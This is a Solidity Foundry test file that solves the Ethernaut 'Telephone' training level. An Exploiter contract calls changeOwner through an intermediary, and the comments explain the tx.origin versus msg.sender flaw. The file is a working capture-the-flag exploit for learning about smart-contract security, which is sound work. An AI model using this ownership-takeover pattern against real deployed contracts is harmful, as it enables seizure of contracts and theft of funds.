// SPDX-License-Identifier: Unlicense
pragma solidity >=0.6.0;
pragma experimental ABIEncoderV2;

import "./utils/BaseTest.sol";
import "src/levels/Telephone.sol";
import "src/levels/TelephoneFactory.sol";

contract TestTelephone is BaseTest {
    Telephone private level;

    constructor() public {
        // SETUP LEVEL FACTORY
        levelFactory = new TelephoneFactory();
    }

    function setUp() public override {
        // Call the BaseTest setUp() function that will also create testsing accounts
        super.setUp();
    }

    function testRunLevel() public {
        runLevel();
    }

    function setupLevel() internal override {
        /** CODE YOUR SETUP HERE */

        levelAddress = payable(this.createLevelInstance(true));
        level = Telephone(levelAddress);

        // Check that the contract is correctly setup
        assertEq(level.owner(), address(levelFactory));
    }

    function exploitLevel() internal override {
        /** CODE YOUR EXPLOIT HERE */

        vm.startPrank(player, player);

        // Deploy the Exploiter contract
        Exploiter exploiter = new Exploiter();

        // make the exploiter call the underlying Level. In this case the `msg.sender` from Level.changeOwner is the `Exploiter`
        // but the `tx.origin` is the user itself who have called the `Exploiter` that has called the `Telephone` contract
        // More info:
        // - https://consensys.github.io/smart-contract-best-practices/development-recommendations/solidity-specific/tx-origin/
        // - https://docs.soliditylang.org/en/develop/security-considerations.html#tx-origin
        exploiter.exploit(level);

        vm.stopPrank();
    }
}

contract Exploiter {
    function exploit(Telephone level) public {
        level.changeOwner(msg.sender);
    }
}
